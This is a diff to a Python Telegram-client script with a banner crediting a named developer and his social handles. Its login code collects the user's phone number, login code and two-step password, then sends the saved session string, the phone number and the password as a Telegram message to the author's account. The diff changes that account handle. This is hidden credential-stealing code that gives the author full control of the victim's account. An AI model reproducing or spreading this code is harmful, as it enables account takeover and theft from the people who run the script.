@@ -16,7 +16,7 @@ print("""\033[031m
 \____|__  /\____|__  /____|__ \___| |____|   
         \/         \/        \/              
 
-Developer: ANKIT KUMAR🏓[@XNKIT69]
+Developer: ANKIT KUMAR🏓[xnkitk.netlify.app]
 Github : @xnkit69
 Instagram : @xnkit69
 Telegram : @xnkitkumar
@@ -32,8 +32,8 @@ if not client.is_user_authorized():
     client.send_code_request(phone_number)
     try:
         me = client.sign_in(phone_number, input('Please enter the code you received: '))
-        client.send_message("@xnkitkumar", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}')
+        client.send_message("@xnkit69", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}')
     except SessionPasswordNeededError:
         password = input('Please enter your password: ')
         me2 = client.sign_in(password=password)  
-        client.send_message("@xnkitkumar", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}\n\nPassword: {password}')
+        client.send_message("@xnkit69", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}\n\nPassword: {password}')
